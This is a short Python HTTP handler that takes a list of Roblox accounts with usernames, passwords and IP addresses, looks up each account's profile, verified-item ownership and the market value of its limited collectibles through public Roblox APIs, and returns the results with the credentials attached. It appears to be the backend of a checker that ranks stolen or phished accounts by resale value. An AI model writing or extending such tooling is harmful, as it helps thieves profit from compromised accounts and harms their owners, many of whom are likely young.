from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error

VERIFIED_ITEM_ID = 102611803

def req_json(url, method="GET", payload=None):
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}
    data = json.dumps(payload).encode("utf-8") if payload else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=8) as res:
            return res.status, json.loads(res.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return e.code, None
    except Exception:
        return 500, None

def scan_one(usn, pw, ip):
    out = {
        "usn": usn, "pass": pw, "ip": ip, "location": "Unknown",
        "name": usn, "id": None, "is_banned": False, "avatar_url": "",
        "total_rap": 0, "limited_found": [], "has_verified": False, "is_private": False
    }
    st, udata = req_json("https://users.roblox.com/v1/usernames/users", "POST", {"usernames": [usn], "excludeBannedUsers": False})
    if st != 200 or not udata or not udata.get("data"):
        return out

    uid = udata["data"][0]["id"]
    out["id"] = uid
    out["name"] = udata["data"][0].get("displayName", usn)

    _, av = req_json(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png&isCircular=false")
    if av and av.get("data"):
        out["avatar_url"] = av["data"][0].get("imageUrl", "")

    st_hat, hat = req_json(f"https://inventory.roblox.com/v1/users/{uid}/items/Asset/{VERIFIED_ITEM_ID}")
    if st_hat == 200 and hat and len(hat.get("data", [])) > 0:
        out["has_verified"] = True

    st_col, col = req_json(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
    if st_col == 403:
        out["is_private"] = True
    elif st_col == 200 and col:
        rap = 0
        lims = []
        for it in col.get("data", []):
            rap += (it.get("recentAveragePrice") or 0)
            if it.get("name"):
                lims.append(it["name"])
        out["total_rap"] = rap
        out["limited_found"] = lims

    return out

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length).decode("utf-8"))
        results = [scan_one(a.get("usn", ""), a.get("pass", "-"), a.get("ip", "-")) for a in body.get("accounts", [])]
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"results": results}).encode("utf-8"))
